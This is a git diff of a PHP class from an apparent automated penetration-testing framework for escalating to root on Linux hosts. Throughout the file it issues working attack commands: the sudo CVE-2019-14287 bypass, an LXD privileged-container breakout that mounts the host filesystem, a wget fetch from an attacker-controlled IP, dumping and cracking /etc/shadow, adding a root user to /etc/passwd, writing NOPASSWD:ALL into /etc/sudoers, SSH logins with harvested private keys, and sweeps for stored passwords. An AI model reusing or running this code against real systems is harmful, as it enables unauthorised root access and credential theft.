@@ -3,9 +3,7 @@
 class check4linux8misc extends check4linux8enum{
     var $tab_authorized_keys_hosts ;
     var $tab_private_keys ;
-    
-    var $created_user_name;
-    var $created_user_pass;
+
 
     
     /*
@@ -14,82 +12,81 @@ class check4linux8misc extends check4linux8enum{
  
      * 
      */
-    public function __construct($eth,$domain,$ip,$port,$protocol,$stream) {
-        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream);
-        $this->created_user_name = "syslog_admin";
-        $this->created_user_pass = "admin123456789";
+    public function __construct($eth,$domain,$ip,$port,$protocol) {
+        parent::__construct($eth,$domain,$ip,$port,$protocol);
+
     }
     
     
-    public function misc2writable_files(){
+    public function misc2writable_files($stream){
         $this->ssTitre(__FUNCTION__);
         // https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/
     }
     
-    public function misc2readable_files(){
+    public function misc2readable_files($stream){
         $this->ssTitre(__FUNCTION__);
         
     }
     
-    public function misc2exec_files(){
+    public function misc2exec_files($stream){
         $this->ssTitre(__FUNCTION__);
     }
     
-    public function misc2sudo8CVE_2019_14287(){
+    public function misc2sudo8CVE_2019_14287($stream){
         $this->ssTitre(__FUNCTION__);
         $template_id_euid = "sudo -u#-1 %ID% -u ";
-        if (!$this->ip2root8db($this->ip2id))  $this->lan2pentest8id($template_id_euid);
+        if (!$this->ip2root8db($this->ip2id))  $this->pentest8id($stream,$template_id_euid);
         $template_id_euid = "sudo -u#4294967295 %ID% -u ";
-        if (!$this->ip2root8db($this->ip2id))  $this->lan2pentest8id($template_id_euid);
+        if (!$this->ip2root8db($this->ip2id))  $this->pentest8id($stream,$template_id_euid);
     }
     
-    public function misc2sudo(){
+    public function misc2sudo($stream){
         $this->ssTitre("can we sudo without supplying a password");
         $template_id_euid = "sudo -l -k %ID% 2>/dev/null";
-        $this->lan2pentest8id($template_id_euid);
+        $this->pentest8id($stream,$template_id_euid);
     }
     
-    public function misc2container(){
+    public function misc2container($stream){
         $this->titre(__FUNCTION__);
-        $this->misc2container2lxd();
-        $this->misc2container2docker();
+        $this->misc2container2lxd($stream);
+        $this->misc2container2docker($stream);
     }
     
     
-    public function misc2container2docker(){
+    public function misc2container2docker($stream){
         $this->ssTitre(__FUNCTION__);
         // https://www.hackingarticles.in/docker-installation-configuration/
         
         $this->note("specific checks - check to see if we're in a docker container");
         
         $data = "docker ps";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "grep -i docker /proc/self/cgroup  2>/dev/null; find / -name \"*dockerenv*\" -exec ls -la {} \; 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->note("specific checks - check to see if we're a docker host");
         $data = "docker --version 2>/dev/null; docker ps -a 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->note("specific checks - are we a member of the docker group");
         $data = "id | grep -i docker 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->note("specific checks - are there any docker files present");
         $data = "find / -name Dockerfile -o -name docker-compose.yml -exec ls -l {} 2>/dev/null \;";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->note("specific checks - are we in an lxd/lxc container");
         $data = "grep -qa container=lxc /proc/1/environ 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->note("specific checks - are we a member of the lxd group");
         $data = "id | grep -i lxd 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
     }
     
-    public function misc2container2lxd(){
+    public function misc2container2lxd($stream){
         $this->ssTitre(__FUNCTION__);
         /*
          wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-root.tar.xz
@@ -106,60 +103,61 @@ lxc launch SomeAlias MyMachine
         $query = "cp -v $this->dir_tools/lan/linux/xenial-server-cloudimg-amd64-root.tar.xz $file_path";
         if (!file_exists($file_path)) $this->requette($query);
         $data = "wget http://$attacker_ip:$this->port_rfi/xenial-server-cloudimg-amd64-root.tar.xz ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $file_path = "$this->dir_tmp/xenial-server-cloudimg-amd64-lxd.tar.xz";
         $query = "cp -v $this->dir_tools/lan/linux/xenial-server-cloudimg-amd64-lxd.tar.xz $file_path";
         if (!file_exists($file_path)) $this->requette($query);
         $data = "wget http://$attacker_ip:$this->port_rfi/xenial-server-cloudimg-amd64-lxd.tar.xz ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
                
         $data = "lxc image import xenial-server-cloudimg-amd64-lxd.tar.xz rootfs xenial-server-cloudimg-amd64-root.tar.xz --alias SomeAlias";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "lxc list";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
                 
         $data = "lxc init SomeAlias test -c security.privileged=true";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "lxc config device add test whatever disk source=/ path=/mnt/root recursive=true ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "lxc start test";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "lxc exec test bash ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $template_id_euid = "lxc exec test bash -c %ID%";
-        $this->lan2pentest8id($template_id_euid);
+        $this->pentest8id($stream,$template_id_euid);
         
         
         
         $data = "lxc launch SomeAlias MyMachine";
-        //$this->lan2stream4result($data,$this->stream_timeout);
+        //$this->req_str($stream,$data,$this->stream_timeout,"");
         
 
     }
     
     
     
-    public function misc(){
+    public function misc($stream){
         $this->titre(__FUNCTION__);
 
         
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys();$this->pause();
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_sudoers();$this->pause();
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_exports();$this->pause();
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_shadow();$this->pause();
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo();$this->pause();
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo8CVE_2019_14287();$this->pause();       
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2writable_files();$this->pause();
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2readable_files();$this->pause();
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2container();$this->pause();
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys();$this->pause();
-        if (!$this->ip2root8db($this->ip2id))  $this->misc4passwd();$this->pause();
+        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys($stream,"/");$this->pause();
+       return 0 ;
+       if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_sudoers($stream);$this->pause();
+       if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_exports($stream);$this->pause();
+       if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_shadow($stream);$this->pause();
+       if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo($stream);$this->pause();
+       if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo8CVE_2019_14287($stream);$this->pause();       
+       if (!$this->ip2root8db($this->ip2id))  $this->misc2writable_files($stream);$this->pause();
+       if (!$this->ip2root8db($this->ip2id))  $this->misc2readable_files($stream);$this->pause();
+       if (!$this->ip2root8db($this->ip2id))  $this->misc2container($stream);$this->pause();
+       if (!$this->ip2root8db($this->ip2id))  $this->misc2keys($stream);$this->pause();
+       if (!$this->ip2root8db($this->ip2id))  $this->misc4passwd($stream);$this->pause();
     }
     
     
@@ -167,41 +165,41 @@ lxc launch SomeAlias MyMachine
     
     
     
-    public function misc2etc_shadow(){
+    public function misc2etc_shadow($stream){
         $this->ssTitre(__FUNCTION__);
         $filename = "/etc/shadow";
         $obj_filename = new FILE($filename);
         
         
         
-        if ($this->lan2file4readable($obj_filename->file_path)){
+        if ($this->file4readable($obj_filename->file_path)){
         
         $data = "grep -v -e '^$' /etc/passwd | grep ':'  | grep -v '^#' | sort -u 2>/dev/null";
         
-        $lines_passwd = $this->lan2stream4result($data,$this->stream_timeout);
+        $lines_passwd = $this->req_str($stream,$data,$this->stream_timeout,"");
         $lines_passwd_str = $this->requette("echo \"$lines_passwd\"  | grep -v 'CMD:' ");
         $result .= $lines_passwd;
         
         $data = "grep -v -e '^$' /etc/shadow /etc/shadow~ | grep ':'  | grep -v '^#' | sort -u 2>/dev/null ";
         
-        $lines_shadow = $this->lan2stream4result($data,$this->stream_timeout);
+        $lines_shadow = $this->req_str($stream,$data,$this->stream_timeout,"");
         $lines_shadow_str = $this->requette("echo \"$lines_shadow\"  | grep -v 'CMD:' ");
         $result .= $lines_shadow;
         
         
         if(!empty($lines_shadow_str)) {
-            $this->lan2root8shadow($lines_shadow_str, $lines_passwd_str);  
+            $this->root8shadow($lines_shadow_str, $lines_passwd_str);  
         }
         }
 
     }
      
-    public function lan2bin4syscall($lan_bin_path){
+    public function bin4syscall($stream,$lan_bin_path){
         $this->ssTitre(__FUNCTION__);
         $strace_bin_rst = array();
         $lan_bin_path = trim($lan_bin_path);
         $data = "strace -s 9999 -v -f $lan_bin_path 2>&1 | grep -i 'execve(' | grep \"execve(\\\"/bin/sh\\\", \\\[\\\"sh\\\", \\\"-c\\\"\\\,\" | grep -Po \"execve\\\(\\\"/bin/sh\\\", \\\[\\\"sh\\\", \\\"-c\\\"\\\, \\\"[a-z]{2,}\\\"\\\]\\\,\"";
-        $strace_bin = trim($this->lan2stream4result($data,$this->stream_timeout*3));
+        $strace_bin = trim($this->req_str($stream,$data,$this->stream_timeout*3,""));
         if (preg_match('#execve\(\"/bin/sh\", \[\"sh\", \"-c\", \"(?<syscall>[[:print:]]{2,})\"\],#',$strace_bin,$strace_bin_rst))
         {
             if (isset($strace_bin_rst['syscall'])){
@@ -215,7 +213,7 @@ lxc launch SomeAlias MyMachine
         }
     }
    
-    public function misc2user8pass8remote($username,$userpass,$ssh_port){
+    public function misc2user8pass8remote($stream,$username,$userpass,$ssh_port){
         $this->ssTitre(__FUNCTION__);
         $username = trim($username);
         $userpass = trim($userpass);
@@ -224,11 +222,11 @@ lxc launch SomeAlias MyMachine
         $template_id_euid = "sshpass -p '$userpass' ssh $username@$this->ip -p $ssh_port -C \"%ID%\" ";
         $query = str_replace("%ID%","id", $template_id_euid);
         $this->requette($query);
-        //$this->lan2pentest8id($template_id_euid);
+        //$this->pentest8id($stream,$template_id_euid);
         //===============================================================
     }
     
-    public function misc2user8pass8local($username,$userpass,$ssh_port){
+    public function misc2user8pass8local($stream,$username,$userpass,$ssh_port){
         $this->ssTitre(__FUNCTION__);
         $username = trim($username);
         $userpass = trim($userpass);
@@ -236,13 +234,13 @@ lxc launch SomeAlias MyMachine
         
         $template_id_euid = "echo -e \"ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' <<#$userpass\n> /dev/tty\nls > /dev/tty\n#\" | bash ";
         $template_id_euid = "(echo '$userpass'; sleep 3; ) | ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";
-        $this->lan2pentest8id($template_id_euid);
+        $this->pentest8id($stream,$template_id_euid);
         //===============================================================
     }
     
      
     
-    public function misc2user8key($username,$remote_privkey_path,$ssh_port){
+    public function misc2user8key($stream,$username,$remote_privkey_path,$ssh_port){
         $this->ssTitre(__FUNCTION__);
         $username = trim($username);
         $remote_privkey_path = trim($remote_privkey_path);
@@ -250,20 +248,19 @@ lxc launch SomeAlias MyMachine
 
         $template_id_euid = "ssh -i $remote_privkey_path  $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";
 
-        $this->lan2pentest8id($template_id_euid);
+        $this->pentest8id($stream,$template_id_euid);
         //===============================================================
     }
 
  
     
-    public function misc2keys2authorized_keys_file($authorized_keys_filepath){
+    public function misc2keys2authorized_keys_file($stream,$authorized_keys_filepath){
         $this->ssTitre(__FUNCTION__);
         //===============================================================
 
             if (!empty($authorized_keys_filepath)){
                 $query = "cat $authorized_keys_filepath";
                 $authorized_keys_str = trim($this->req_ret_str($query));
-                $stream = $this->stream ;
                 $local_username = "";
                 $local_home_user = "";
                 $ip2users = $this->ip2users4passwd();
@@ -290,7 +287,7 @@ lxc launch SomeAlias MyMachine
         $this->pause();
         
         foreach ($public_key_ssh_rsa_file_tab_remote as $authorized_keys_filepath){
-           $this->misc2keys2authorized_keys_file($authorized_keys_filepath);
+            $this->misc2keys2authorized_keys_file($stream,$authorized_keys_filepath);
         }
         //===============================================================
         
@@ -302,13 +299,16 @@ lxc launch SomeAlias MyMachine
         $this->ssTitre(__FUNCTION__);
         $tab_home = array();
         $this->note("home user");
-        $data = "ls -l $path2search/home/* 2>/dev/null ";
-        $filter = "| grep ':' | cut -d':' -f1 $this->filter_file_path ";
+        $data = "ls -dl $path2search/home/* 2>/dev/null ";
+        $filter = "| awk '{print $9}' $this->filter_file_path ";
         $tab_home = $this->req_tab($stream,$data,$this->stream_timeout,$filter);
-        $data = "ls -l $path2search/root 2>/dev/null ";
-        $filter = "| grep ':' | cut -d':' -f1 $this->filter_file_path ";
+        var_dump($tab_home);
+        $this->pause();
+        $data = "ls -dl $path2search/root 2>/dev/null ";
+        $filter = "| awk '{print $9}' $this->filter_file_path ";
         $tab_home[] = $this->req_str($stream,$data,$this->stream_timeout,$filter);
         $tab_home = array_reverse($tab_home);
+        $this->article("All Home User", $this->tab($tab_home));
         //$tab_home = array("/home/nightfall");
         if (isset($tab_home[0])){
             foreach ($tab_home as $home_user){
@@ -326,39 +326,42 @@ lxc launch SomeAlias MyMachine
         $this->article("home user",$home_user);
         $authorized_keys_filepath = "";
         $authorized_keys_str = "";
-        $query = "echo '$home_user' | grep -Po \"/home/[[:print:]]{1,}\" | sed \"s#/home/##g\"  ";
+        $query = "echo '$home_user' $this->filter_file_path | sed \"s#/tmp/$this->ip.$this->port.nfs##g\"  | sed \"s#/home/##g\" | sed \"s#/##g\" | grep -Po \"[a-z0-9\_]{1,}\" ";
         exec($query,$tmp);
+        $this->requette($query);
         if (isset($tmp[0])) $remote_username = trim($tmp[0]);
+        
+        $this->article("Remote Username", $remote_username);
         if (!empty($remote_username)) $this->service4authorized_keys($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, "", $remote_username, $home_user);
         
         
     }
     
-    public function misc2keys4info(){
+    public function misc2keys4info($stream){
         $this->ssTitre(__FUNCTION__);
         //===============================================================
         $data = "ls -alR ~/.ssh ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->note("Can private-key information be found?");
         $data = "ls /home/*\/.ssh/*";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "grep -v -e '^$' /etc/ssh/config ";
-        $this->lan2stream4result($data,$this->stream_timeout);       
+        $this->req_str($stream,$data,$this->stream_timeout,"");       
         
         $data = "grep -v -e '^$' /etc/ssh/ssh_config | grep -v \"^#\"";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "grep 'PubkeyAuthentication' /etc/ssh/ssh_config ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
 
         $this->note("checks for if various ssh files are accessible");
         $data = "find / \( -name \"*_dsa\" -o -name \"*_rsa\" -o -name \"known_hosts\" -o -name \"authorized_hosts\" -o -name \"authorized_keys\" \) -exec ls -la {} 2>/dev/null \;";
-        $this->lan2stream4result($data,$this->stream_timeout*3);
+        $this->req_str($stream,$data,$this->stream_timeout*3,"");
         
         $data = "grep \"PermitRootLogin\" /etc/ssh/sshd_config 2>/dev/null | grep -v \"#\" ";
-        $check_root_acces = trim($this->lan2stream4result($data,$this->stream_timeout));
+        $check_root_acces = trim($this->req_str($stream,$data,$this->stream_timeout,""));
         if(stristr($check_root_acces,"PermitRootLogin yes")!==FALSE) $this->log2succes("Yes Root Access is Permited");
         if(stristr($check_root_acces,"PermitRootLogin no")!==FALSE) $this->note("Root Access is Not Permited");
     }
@@ -368,30 +371,46 @@ lxc launch SomeAlias MyMachine
     public function misc2keys4users($stream,$path2search){
         $this->titre(__FUNCTION__);
         $tab_privkeys = array();
-        
+        $ssh_ports = $this->ip2ports4service("ssh");
+        if (!empty($ssh_ports)){
+            
         $data = "find $path2search \( -name \"id_dsa\" -o -name \"id_rsa\" -o -name \"ssh_host_key\" -o -name \"ssh_host_rsa_key\" -o -name \"ssh_host_dsa_key\" -o -name \"identity\"  \) -exec ls {} 2>/dev/null \;";
         $filter = "| grep -i -Po \"^(/[a-z0-9\-\_\.]{1,})*\" | sort -u ";
         $tab_privkeys = $this->req_tab($stream,$data,$this->stream_timeout*3,$filter);
 
         $this->article("All Priv Keys Location", $this->tab($tab_privkeys));
-        $tab_users_shell = $this->ip2users();
+        $tab_users_shell = $this->ip2users4shell();
+        if (empty($tab_users_shell)) $tab_users_shell = $this->ip2users();
+        
+        $tab_users_shell = array("hbeale");
+        $tab_privkeys = array("/media/USB_1/Stuff/Keys/id_rsa");
         
         if (!empty($tab_privkeys)){
             foreach ($tab_privkeys as $remote_privkey_path){
                 $remote_privkey_path = trim($remote_privkey_path);
-                foreach ($tab_users_shell as $username){
-                    $ssh_ports = $this->ip2ports4service("ssh");
+                foreach ($tab_users_shell as $username){                    
                     foreach ($ssh_ports as $ssh_port){
-                        if (empty($ssh_port)) $ssh_port = "22" ;
-                    if (!empty($username)) $this->misc2user8key($username, $remote_privkey_path, $ssh_port);
+                        if ( !empty($username) && !empty($ssh_port) ) $this->misc2user8key($stream,$username, $remote_privkey_path, $ssh_port);
             }
                 }
             }
        
         }
+        }
+    }
+    public function users2pass($stream,$user2name, $user2pass){
+        $this->titre(__FUNCTION__);
+        $ssh_ports = $this->ip2ports4service("ssh");
+        foreach ($ssh_ports as $ssh_port){
+            if (empty($ssh_port)) $ssh_port = "22" ;
+            $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);        
+            $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
+            $this->users2user($stream,$user2name, $user2pass);
+        }
     }
     
-    public function users4pass(){
+    
+    public function users4pass($stream){
         $this->titre(__FUNCTION__);
         $ssh_ports = $this->ip2ports4service("ssh");
         
@@ -404,9 +423,9 @@ lxc launch SomeAlias MyMachine
                 if (!$this->ip2root8db($this->ip2id)) {
                     
                     
-                    $this->misc2user8pass8local($user2name, $user2pass,$ssh_port);
+                    $this->misc2user8pass8local($stream,$user2name, $user2pass,$ssh_port);
 
-                    $this->misc2user8pass8remote($user2name, $user2pass,$ssh_port);
+                    $this->misc2user8pass8remote($stream,$user2name, $user2pass,$ssh_port);
                 }
             }
         }
@@ -424,89 +443,89 @@ lxc launch SomeAlias MyMachine
     
     
     
-    public function misc4passwd(){
+    public function misc4passwd($stream){
         
         $this->titre(__FUNCTION__);
         $this->note("Grep hardcoded passwords");
         $this->note("Is there anything in the log file(s)");
         $data = "grep -i pass /var/log/*log 2>/dev/null";
-        $lines = $this->lan2stream4result($data,$this->stream_timeout);
+        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
         $result .= $lines;
         $this->pause();
         
         $data = "find / -type f -iname  \"*.php\" -exec grep -i -E \"(passwd|password|user|root|pass)\"   {} \; | grep -v \"#\"   2>/dev/null ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         $this->note("Any of the service(s) settings misconfigured ? Are any (vulnerable) plugins attached?");
         $data = "find / -type f -iname  \"*.config\" -exec grep -i -E \"(passwd|password|user|root)\"  {} \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         $data = "find / -type f -iname  \"*.conf\" -exec grep -i -E \"(passwd|password|user)\"   {}  \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         $data = "find / -type f -iname  \"*.cfg\" -exec grep -i -E \"(passwd|password|user|root)\"   {} \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->note("password policy information as stored in /etc/login.defs");
         $data = "grep \"^PASS_MAX_DAYS|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD\" /etc/login.defs 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         $data = "ps -eo args --user 0 --no-headers ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         
         $data = "cat ~/.profile  | grep -v '^#' | sort -u 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "cat /var/mail/root";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "cat /var/spool/mail/root";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "btmp";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "wtmp";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "udev";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "messages";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "syslog";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "debug";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "boot";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         $this->ssTitre("looks for hidden files");
         $data = "find / -name \".*\" -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \; 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $data = "dmesg | grep -i -E \"(segfault|root|passw)\" ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         $this->note("OpenBSD");
         $data = "grep -v -e '^$' /etc/master.passwd  | grep -v '^#'  2>/dev/null ";
-        $lines = $this->lan2stream4result($data,$this->stream_timeout);
+        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
         $result .= $lines;
         $this->pause();
         
         $data = "grep -r -i pass /var/www/* 2>/dev/null";
-        $lines = $this->lan2stream4result($data,$this->stream_timeout);
+        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
         $result .= $lines;
         $this->pause();
         
@@ -514,7 +533,7 @@ lxc launch SomeAlias MyMachine
         $this->note("htpasswd check");
         $users_pass_htpasswd = array();
         $data = "find / -name .htpasswd -print -exec cat {} \; 2>/dev/null  | grep ':' | sort -u";
-        $users_pass_found = trim($this->lan2stream4result($data,$this->stream_timeout));
+        $users_pass_found = trim($this->req_str($stream,$data,$this->stream_timeout,""));
         $result .= $users_pass_found ;
         $this->article("ALL USERS FOUND", $users_pass_found);
         if(!empty($users_pass_found)){
@@ -561,7 +580,7 @@ lxc launch SomeAlias MyMachine
         return $result;
     }
     
-    public function misc2etc_passwd2crackpass($username2avoid,$etc_passwd_lanpath){
+    public function misc2etc_passwd2crackpass($stream,$username2avoid,$etc_passwd_lanpath){
         
         $result = "";
         $this->ssTitre(__FUNCTION__);
@@ -569,22 +588,22 @@ lxc launch SomeAlias MyMachine
 If the user does not have a password, then the password field will have an *(asterisk).";
         $this->note($chaine);
         $data = "grep ':*:' $etc_passwd_lanpath 2>/dev/null";
-        $lines = $this->lan2stream4result($data,$this->stream_timeout);
+        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
         $this->article("Users with NoPassword", $lines);
         if (!empty($lines)) $users_nopasswd = explode('\n', $lines);
         
         $data = "grep -v '^[^:]*:[x]' $etc_passwd_lanpath 2>/dev/null | grep -v '$username2avoid' ";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         $this->note("checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)");
         $data = "grep -v '^[^:]*:[x]' $etc_passwd_lanpath 2>/dev/null";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
         return $result;
     }
     
-    public function misc2etc_passwd2add($username,$userpass,$etc_passwd_lanpath){
+    public function misc2etc_passwd2add($stream,$username,$userpass,$etc_passwd_lanpath){
         
         $result = "";
         $this->ssTitre(__FUNCTION__);
@@ -604,9 +623,9 @@ If the user does not have a password, then the password field will have an *(ast
         $this->article("user_pass_crypt",$user_pass_crypt);
         $search = $user.':'.$user_pass_crypt.':0:0:root:/root:/bin/sh';
         
-        if ($this->lan2file4writable($obj_filename->file_path)){
-            if (!$this->lan2file4search($obj_filename->file_path, $search)){
-                $result .= $this->lan2file4add($obj_filename->file_path, $search);
+        if ($this->file4writable($obj_filename->file_path)){
+            if (!$this->file4search($obj_filename->file_path, $search)){
+                $result .= $this->file4add($obj_filename->file_path, $search);
             }
             //$result .= $this->stream4root($this->stream);
             $result .= $this->stream8ssh8passwd($this->ip,$this->port,$this->created_user_name, $userpass);
@@ -615,7 +634,7 @@ If the user does not have a password, then the password field will have an *(ast
     }
     
     
-    public function misc2etc_passwd2nopasswd($username2avoid,$etc_passwd_lanpath){
+    public function misc2etc_passwd2nopasswd($stream,$username2avoid,$etc_passwd_lanpath){
         
         $result = "";
         $this->ssTitre(__FUNCTION__);
@@ -623,29 +642,29 @@ If the user does not have a password, then the password field will have an *(ast
         return $result;
     }
     
-    public function misc2etc_passwd(){
+    public function misc2etc_passwd($stream){
         $this->ssTitre(__FUNCTION__);
         // https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
         
         $etc_passwd_lanpath = "/etc/passwd";
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2nopasswd($this->created_user_name, $etc_passwd_lanpath);        
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2crackpass($this->created_user_name, $etc_passwd_lanpath);
-        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2adduser($this->created_user_name, $this->created_user_pass,$etc_passwd_lanpath);
+        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2nopasswd($stream,$this->created_user_name, $etc_passwd_lanpath);        
+        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2crackpass($stream,$this->created_user_name, $etc_passwd_lanpath);
+        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2adduser($stream,$this->created_user_name, $this->created_user_pass,$etc_passwd_lanpath);
         
         
         return $result;
    }
     
     
-    public function misc2etc_sudoers(){
+   public function misc2etc_sudoers($stream){
         $this->ssTitre(__FUNCTION__);
         $etc_sudoers_path = "/etc/sudoers";
         $obj_filename = new FILE($etc_sudoers_path);
         $search = "$this->uid_name ALL=(ALL:ALL) NOPASSWD:ALL";
         
-        if ($this->lan2file4writable($obj_filename->file_path)){
-            if (!$this->lan2file4search($obj_filename->file_path, $search)){
-                $this->lan2file4add($obj_filename->file_path, $search);
+        if ($this->file4writable($obj_filename->file_path)){
+            if (!$this->file4search($obj_filename->file_path, $search)){
+                $this->file4add($obj_filename->file_path, $search);
             }
             $this->users4root($this->uid_name, '');
         }
@@ -657,7 +676,7 @@ If the user does not have a password, then the password field will have an *(ast
     
  
     
-    public function misc2etc_exports2setsuid($mount_rhost_path){
+    public function misc2etc_exports2setsuid($stream,$mount_rhost_path){
         $this->ssTitre(__FUNCTION__);
         $this->article("LD_PRELOAD Exploit","This attack involves .so files (part of the dynamic link library) being used by programs.
         The attacker can add a program pretending to be one of these libraries so that when a program is
@@ -680,33 +699,33 @@ If the user does not have a password, then the password field will have an *(ast
         }
 EOC;
         $data = "echo '$suid' > $this->vm_tmp_lin/suid.c ";
-        //$this->lan2stream4result($data,$this->stream_timeout);
+        //$this->req_str($stream,$data,$this->stream_timeout,"");
         $this->req_ret_str($data);
         
         $this->pause();
         
